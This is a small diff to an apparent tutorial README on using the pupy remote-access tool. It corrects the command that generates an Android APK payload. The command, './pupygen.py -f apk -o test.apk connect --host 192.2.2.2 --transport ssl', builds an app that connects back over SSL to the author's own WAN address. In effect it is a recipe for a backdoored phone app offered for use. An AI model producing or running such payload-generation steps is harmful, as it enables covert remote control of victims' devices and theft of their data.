@@ -12,7 +12,7 @@ you need a open port & you can see this tutorial https://github.com/Faral-Ghaemi
 
 so open the terminal in the pupy/pupy and type this command:
 ```
-./pupygen -f apk -o test.apk connect --host 192.2.2.2 --transport ssl
+./pupygen.py -f apk -o test.apk connect --host 192.2.2.2 --transport ssl
 note : 192.2.2.2 is my wan ip 
 ```
 and now you can see test.apk in pupy/pupy 
